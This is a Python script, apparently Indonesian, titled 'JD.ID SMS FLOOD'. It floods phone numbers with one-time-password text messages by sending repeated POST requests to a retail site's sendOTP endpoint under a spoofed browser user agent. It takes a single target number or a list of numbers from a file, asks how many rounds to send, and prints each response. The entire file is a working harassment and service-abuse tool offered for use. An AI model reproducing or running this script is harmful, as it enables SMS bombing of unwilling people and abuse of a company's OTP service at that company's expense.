import requests
from os import system
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
def banner():
    author = "____________"
    qiuby, zhukhi = "Qiuby ","Zhukhi"
    judul = "JD.ID SMS FLOOD"    
    system("clear")
    print """
    _______  ______   _______ 
    (  ____ )(  ___ \ (       ) {}
    | (    )|| (   ) )| () () | {}
    | (____)|| (__/ / | || || | {}
    |  _____)|  __ (  | |(_)| | 
    | (      | (  \ \ | |   | | 
    | )      | )___) )| )   ( |
    |/       |/ \___/ |/     \|
                               
    _________ _______  _______  _______ 
    \__   __/(  ____ \(  ___  )(       )
       ) (   | (    \/| (   ) || () () |
       | |   | (__    | (___) || || || |
       | |   |  __)   |  ___  || |(_)| |
       | |   | (      | (   ) || |   | |
       | |   | (____/\| )   ( || )   ( |
       )_(   (_______/|/     \||/     \|

    """.format("Author: "+G+author+W,
    	          "Python: "+R+qiuby+W+zhukhi,
    	          O+judul+W)
class Bomsms(object):
    list_no = []
    def __init__(self):
        self.kirim = requests.session()
        self.headers = {"User - Agent":"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"}
        self.url = "https://www.phd.co.id/en/users/sendOTP"
    def start(self, no):
        print "{}Nomor: {}{} {}{}".format(O, W, G,no, W)
        print self.kirim.post(self.url,data = {"phone":no, "smsType":"1"} , headers=self.headers).text
        self.kirim.cookies.clear
    def parser(self, msisdn):
        if msisdn[0:1] in "08":
            Bomsms.list_no.append([msisdn,"62"+msisdn[1::]])
        elif msisdn[0:1] in "62":
            Bomsms.list_no.append([msisdn, "0"+msisdn[2::]])
        elif msisdn[0] in "+":
            Bomsms.list_no.append([msisdn.replace("+",""), "0"+msisdn[3::]])
        return Bomsms.list_no
    def single_num(self):
        for no in Bomsms.list_no:
            print P+"Flood No: ", no[0]+W
            for num in no:
                self.start(num)
    #Buka list txt
    def phone_list(self,f):
        with open(f) as phone_book:
            for book in phone_book.readlines():
                book = book.split("\n")[0]
                self.parser(book)
        return Bomsms.list_no
    #startlist
    def start_list(self):
        for num in Bomsms.list_no:
            print P+"Flood Number: ", num[0]+W
            for number in num:
                self.start(number) 
#Overriding class
class flood(Bomsms):
    def __init__(self):
        Bomsms.__init__(self)
    def nangid(self, jml):
        for _ in range(0,int(jml)):
            self.single_num()
    def txt_flood(self, jml):
        for _ in range(0,int(jml)):
            self.start_list()
def single(no, jumlah):
    Bomsms().parser(no)
    flood().nangid(jumlah)
def list_txt(f):
    Bomsms().phone_list(f)
    Bomsms().start_list()
def flood_txt(f, jumlah):
    Bomsms().phone_list(f)
    flood().txt_flood(jumlah)
def ops():
    while True:
        try:
            jumlah = int(raw_input(R+"Jumlah Flood: "+W))
            print G+"[+] ------- [ MENU ] ------- [+]"+W
            print "[1] Single Target\n[2] Multi Target List"
            print G+"[+] -------------------------[+]"+W
            opsi = int(raw_input(O+"Masukkan Pilihan: "+W))            
            print P+"[?] Nomor HP awalan +62, 62 atau 08 [?]\n"+W
            if opsi == 1:
                no = raw_input(O+"NO HANDPHONE: "+W)        
                single(no,jumlah)
            elif opsi == 2:
                print "File path *.txt contoh : \n/storage/emulated/0/a/video/no.txt\n"
                files = raw_input("Masukkan file path *.txt: ")
                #files = "/storage/emulated/0/a/video/no.txt"
                print G+"[+] --- [ MENU MULTI TARGET ] --- [+]"+W
                print "[1] SEND KEBANYAK\n[2] FLOOD KEBANYAK"
                print G+"[+] ----------------------------- [+]"+W
                ops2 = raw_input(O+"Pilihan: "+W)
                if ops2 == "1":
                    print P+"[+] SEND KEBANYAK [+]"+W
                    list_txt(files)
                elif ops2 == "2":
                    print R+"[+] FLOOD KEBANYAK [+]"+W
                    flood_txt(files, jumlah)
                else:
                    print R+"[!] Nomor Yang di pilih tidak ada [!]"+W
                    continue
            else:
                print R+"[!] Masukkan No dengan Bennar [!]"+W
                continue
        except ValueError:
            print R+"[!] BUKAN NOMOR [!]"+W
            continue
        break
if __name__ == "__main__":
    banner()
    ops()